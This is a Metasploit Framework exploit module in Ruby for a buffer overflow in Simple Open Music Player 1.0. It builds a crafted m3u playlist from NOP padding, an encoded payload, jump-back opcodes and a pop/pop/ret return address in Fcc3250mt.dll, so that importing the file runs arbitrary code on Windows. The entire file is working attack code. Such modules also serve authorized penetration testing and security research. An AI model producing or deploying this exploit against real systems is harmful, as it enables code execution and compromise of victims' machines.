##
# $Id: somplplayer_m3u.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GreatRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'S.O.M.P.L 1.0 Player Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in Simple Open Music Player v1.0. When
				the application is used to import a specially crafted m3u file, a buffer overflow occurs
				allowing arbitrary code execution.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'Rick2600',  # Original Exploit
					'dookie'     # MSF Module
				],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'OSVDB', '64368' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/11219' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 500,
					'BadChars' => "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d",
					'StackAdjustment' => -3500
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'Windows Universal', { 'Ret' => 0x32501B07 } ],        # p/p/r in Fcc3250mt.dll
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Jan 22 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME', [ false, 'The file name.', 'msf.m3u']),
			], self.class)

	end

	def exploit

		sploit = make_nops(5)
		sploit << payload.encoded
		sploit << make_nops(4138 - (payload.encoded.length))
		sploit << "\xE9\xCD\xEF\xFF\xFF"	# Jump back to our nops
		sploit << "\xEB\xF9\x90\x90"		# Short jump back
		sploit << [target.ret].pack('V')

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(sploit)

	end

end
